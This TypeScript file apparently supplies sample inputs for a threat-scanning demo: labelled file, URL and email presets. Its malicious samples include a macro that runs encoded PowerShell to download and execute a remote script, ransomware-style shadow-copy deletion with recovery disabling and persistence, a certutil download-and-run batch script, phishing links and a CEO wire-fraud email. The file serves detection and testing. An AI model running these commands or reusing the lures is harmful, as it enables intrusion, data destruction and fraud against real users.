export interface PresetItem {
  id: string;
  name: string;
  badge: 'Clean' | 'Suspicious' | 'Malicious';
  description: string;
  data: any;
}

export const FILE_PRESETS: PresetItem[] = [
  {
    id: 'macro-dropper',
    name: 'Invoice_Overdue_March2026.docm',
    badge: 'Malicious',
    description: 'Macro-enabled document containing obfuscated PowerShell execution string',
    data: {
      filename: 'Invoice_Overdue_March2026.docm',
      mimeType: 'application/vnd.ms-word.document.macroEnabled.12',
      content: `Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=="
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run cmd, 0, False
End Sub`,
    },
  },
  {
    id: 'ransomware-binary',
    name: 'decrypt_tool_win64.exe',
    badge: 'Malicious',
    description: 'High-entropy binary artifact attempting vssadmin shadow copy deletion',
    data: {
      filename: 'decrypt_tool_win64.exe',
      mimeType: 'application/x-dosexec',
      content: `MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & schtasks /create /tn "WinSecTask" /tr "C:\\temp\\payload.exe" /sc onlogon`,
    },
  },
  {
    id: 'clean-audit-report',
    name: 'Q1_Financial_Audit_Report.pdf',
    badge: 'Clean',
    description: 'Legitimate standard corporate PDF document with valid structure',
    data: {
      filename: 'Q1_Financial_Audit_Report.pdf',
      mimeType: 'application/pdf',
      content: `%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 120 >>
stream
BT
/F1 14 Tf
72 712 Td
(ThreatShield Cybersecurity Compliance Report - All endpoints secured.) Tj
ET
endstream
endobj
xref
trailer
<< /Root 1 0 R >>
%%EOF`,
    },
  },
  {
    id: 'suspicious-script',
    name: 'system_cleanup_patch.bat',
    badge: 'Suspicious',
    description: 'Batch script with encoded certutil binary downloads from external IP',
    data: {
      filename: 'system_cleanup_patch.bat',
      mimeType: 'text/plain',
      content: `@echo off
echo Running essential maintenance...
certutil.exe -urlcache -split -f "http://185.220.101.5/stage2.bin" %TEMP%\\update.exe
attrib +h %TEMP%\\update.exe
start %TEMP%\\update.exe`,
    },
  },
];

export const URL_PRESETS: PresetItem[] = [
  {
    id: 'paypal-phish',
    name: 'PayPal Phishing Portal',
    badge: 'Malicious',
    description: 'Brand spoofing credential harvest with fake recovery parameters on untrusted TLD',
    data: {
      url: 'http://security-paypal-auth-verification.xyz/webapps/account/recovery?token=session_auth_7819',
    },
  },
  {
    id: 'm365-phish',
    name: 'Microsoft 365 Password Reset Phishing',
    badge: 'Malicious',
    description: 'Typosquatting subdomained link impersonating Microsoft login identity',
    data: {
      url: 'http://login.microsoftonline.com-authportal.top/oauth/v2/login?auth_session=critical',
    },
  },
  {
    id: 'google-legit',
    name: 'Google Accounts Portal (Official)',
    badge: 'Clean',
    description: 'Official Google OAuth authentication endpoint',
    data: {
      url: 'https://accounts.google.com/signin/v2/identifier',
    },
  },
  {
    id: 'github-api',
    name: 'GitHub Public API Gateway',
    badge: 'Clean',
    description: 'Verified REST API endpoint for GitHub developer platform',
    data: {
      url: 'https://api.github.com/zen',
    },
  },
];

export const EMAIL_PRESETS: PresetItem[] = [
  {
    id: 'ceo-wire-fraud',
    name: 'CEO Urgent Wire Transfer (BEC Fraud)',
    badge: 'Malicious',
    description: 'Executive impersonation with mismatched return path demanding immediate confidential funds',
    data: {
      sender: 'CEO Johnathan Miller <executive-office-internal@consulting-direct.top>',
      replyTo: 'johnathan.miller.private@mail-forwarder.xyz',
      returnPath: 'bounce@unverified-relay.top',
      subject: 'URGENT: Confidential Acquisition Wire Payment Required within 2 Hours',
      body: `Hi,

I am currently in an executive board meeting and cannot take calls.

We are closing a confidential acquisition today. I need you to initiate an urgent domestic wire transfer of $84,500 to our external legal escrow counsel immediately.

Wire details:
Bank: First International Escrow
Account: 9482-1082-841
Routing: 021000089
Beneficiary: Apex Legal Escrow Group

Please confirm when the transfer receipt is ready. Keep this strictly between us until the formal press release tomorrow morning.

Best regards,
Johnathan Miller
Chief Executive Officer`,
    },
  },
  {
    id: 'm365-quishing',
    name: 'Microsoft 365 Password Expiration Phishing',
    badge: 'Malicious',
    description: 'Credential harvesting notification with spoofed sender and urgent termination deadline',
    data: {
      sender: 'IT Helpdesk Security <no-reply@microsoft-notification-center.xyz>',
      replyTo: 'support@account-recovery-service.top',
      returnPath: 'mailer@microsoft-notification-center.xyz',
      subject: 'Action Required: Your Office 365 Password Expires Today (October 8, 2026)',
      body: `Notice: Microsoft 365 Security Department

Your corporate mailbox password for user account is set to expire in 4 hours.

If you do not retain your current password or synchronize credentials now, your email access and OneDrive sync will be permanently locked.

To keep your current password, click the verification link below:
https://login.microsoftonline.com-authportal.top/oauth/v2/login?session=expiring

Failure to complete this verification will result in immediate suspension of enterprise resources.

IT Security Administration
Ticket Reference: #MSFT-88310-SEC`,
    },
  },
  {
    id: 'clean-github-2fa',
    name: 'GitHub Security Alert (Authentic 2FA)',
    badge: 'Clean',
    description: 'Legitimate security notification with authentic sender headers and valid domains',
    data: {
      sender: 'GitHub Security <no-reply@github.com>',
      replyTo: 'support@github.com',
      returnPath: 'bounces@github.com',
      subject: '[GitHub] A new personal access token was created on your account',
      body: `Hey there,

A new personal access token (classic) was generated for your GitHub account on October 8, 2026.

Token Name: ThreatShield CI/CD Integration
Permissions: repo, read:org
IP Address: 198.51.100.24 (Mountain View, CA)

If you made this change, you don't need to do anything. If you didn't create this token, please visit your account settings immediately to revoke it:
https://github.com/settings/tokens

Thanks,
The GitHub Security Team`,
    },
  },
];
